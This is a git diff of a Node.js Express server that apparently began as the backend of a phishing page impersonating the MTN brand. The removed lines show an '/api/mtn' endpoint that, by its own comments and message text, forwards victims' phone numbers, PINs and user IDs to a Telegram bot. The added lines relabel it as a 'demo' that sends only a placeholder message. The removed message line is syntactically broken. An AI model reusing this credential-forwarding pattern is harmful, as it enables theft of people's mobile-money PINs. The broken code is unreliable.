@@ -4,10 +4,10 @@ const app = express();
 app.use(express.json());
 app.use(express.static(__dirname));
 
-app.post("/api/mtn", async (req, res) => {
-  console.log("Received MTN request:", req.body);
+app.post("/api/demo", async (req, res) => {
+  console.log("Received DEMO request:", req.body);
 
-  if (req.body.event !== "MTN_PIN_ACCEPTED") {
+  if (req.body.event !== "DEMO_PIN_ACCEPTED") {
     return res.status(400).json({
       success: false,
       error: "Invalid demo event"
@@ -15,7 +15,7 @@ app.post("/api/mtn", async (req, res) => {
   }
 
   // Telegram notification is optional.
-  // Phone number,PIN is accepted and transmitted.
+  // No phone number or PIN is accepted or transmitted.
   if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
     console.log("Telegram environment variables are missing.");
     return res.json({
@@ -35,7 +35,8 @@ app.post("/api/mtn", async (req, res) => {
       },
       body: JSON.stringify({
         chat_id: process.env.TELEGRAM_CHAT_ID,
-        text:"Phone number, Pincode,User ID,Time".})
+        text: "🧪 Demo verification completed successfully. No real credentials collected."
+      })
     });
 
     console.log("Telegram response status:", response.status);
@@ -48,7 +49,7 @@ app.post("/api/mtn", async (req, res) => {
       });
     }
 
-    console.log("Phone number,pincode be sent to Telegram.");
+    console.log("Telegram demo notification sent.");
     res.json({
       success: true,
       telegram: true
@@ -67,5 +68,5 @@ app.post("/api/mtn", async (req, res) => {
 const PORT = process.env.PORT || 10000;
 
 app.listen(PORT, "0.0.0.0", () => {
-  console.log(`Mtn running on port ${PORT}`);
+  console.log(`Demo running on port ${PORT}`);
 });
